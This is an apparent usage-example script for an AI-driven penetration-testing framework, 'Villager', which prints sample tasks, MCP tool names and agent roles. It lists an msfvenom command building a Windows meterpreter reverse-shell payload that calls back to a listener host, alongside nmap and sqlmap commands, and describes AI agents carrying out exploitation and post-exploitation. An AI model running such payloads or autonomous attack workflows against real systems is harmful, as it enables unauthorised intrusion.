#!/usr/bin/env python3
"""
Villager AI Framework - Basic Usage Example

This example demonstrates how to use the Villager AI Framework
for basic cybersecurity operations.
"""

import sys
import os
import time

# Add Villager to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

def main():
    """Basic usage example of Villager AI Framework."""
    
    print("🏘️ Villager AI Framework - Basic Usage Example")
    print("=" * 50)
    
    # Example 1: Create a security assessment task
    print("\n📋 Example 1: Creating a Security Assessment Task")
    print("-" * 45)
    
    # This would typically be done through MCP tools in Cursor
    task_example = {
        "abstract": "Network Security Assessment",
        "description": "Perform comprehensive security assessment of target network 192.168.1.0/24",
        "verification": "Provide detailed report with vulnerabilities and recommendations"
    }
    
    print(f"Task Abstract: {task_example['abstract']}")
    print(f"Description: {task_example['description']}")
    print(f"Verification: {task_example['verification']}")
    
    # Example 2: Security tool execution
    print("\n🔧 Example 2: Security Tool Execution")
    print("-" * 40)
    
    tools_examples = [
        {
            "tool": "msfvenom",
            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe",
            "description": "Generate Windows meterpreter payload"
        },
        {
            "tool": "nmap",
            "command": "nmap -sV -sC 192.168.1.1",
            "description": "Scan target for services and vulnerabilities"
        },
        {
            "tool": "sqlmap",
            "command": "sqlmap -u 'http://target.com/login.php' --dbs",
            "description": "Test for SQL injection vulnerabilities"
        }
    ]
    
    for tool_example in tools_examples:
        print(f"\n{tool_example['tool'].upper()}:")
        print(f"  Command: {tool_example['command']}")
        print(f"  Purpose: {tool_example['description']}")
    
    # Example 3: Agent scheduling
    print("\n🤖 Example 3: Agent Scheduling")
    print("-" * 35)
    
    agent_examples = [
        {
            "agent": "Security Analyst",
            "task": "Analyze network scan results and prioritize vulnerabilities",
            "capabilities": "Vulnerability assessment, risk analysis, reporting"
        },
        {
            "agent": "Penetration Tester",
            "task": "Execute exploitation attempts on identified vulnerabilities",
            "capabilities": "Exploit development, payload creation, post-exploitation"
        },
        {
            "agent": "Incident Responder",
            "task": "Investigate security incidents and provide remediation",
            "capabilities": "Forensic analysis, incident response, threat hunting"
        }
    ]
    
    for agent_example in agent_examples:
        print(f"\n{agent_example['agent']}:")
        print(f"  Task: {agent_example['task']}")
        print(f"  Capabilities: {agent_example['capabilities']}")
    
    # Example 4: MCP Integration
    print("\n🔗 Example 4: MCP Integration")
    print("-" * 35)
    
    mcp_examples = [
        "mcp_villager-proper_create_task() - Create AI-driven tasks",
        "mcp_villager-proper_get_task_status() - Monitor task progress",
        "mcp_villager-proper_schedule_agent() - Schedule AI agents",
        "mcp_villager-proper_execute_tool() - Execute security tools",
        "mcp_villager-proper_get_system_status() - Get system status"
    ]
    
    for mcp_example in mcp_examples:
        print(f"  • {mcp_example}")
    
    # Example 5: Complete workflow
    print("\n🔄 Example 5: Complete Workflow")
    print("-" * 35)
    
    workflow_steps = [
        "1. Create task through MCP: 'Assess target.com for vulnerabilities'",
        "2. Villager decomposes task into subtasks automatically",
        "3. Agent Scheduler assigns tasks to appropriate agents",
        "4. Security tools execute in isolated Kali containers",
        "5. Results are collected and analyzed by AI",
        "6. Comprehensive report is generated with findings"
    ]
    
    for step in workflow_steps:
        print(f"  {step}")
        time.sleep(0.5)  # Simulate processing time
    
    print("\n✅ Basic usage examples completed!")
    print("\n📚 For more examples, see:")
    print("  • examples/security_assessment.py")
    print("  • examples/payload_generation.py")
    print("  • examples/custom_agents.py")
    print("\n📖 For detailed documentation, see docs/README.md")

if __name__ == "__main__":
    main()
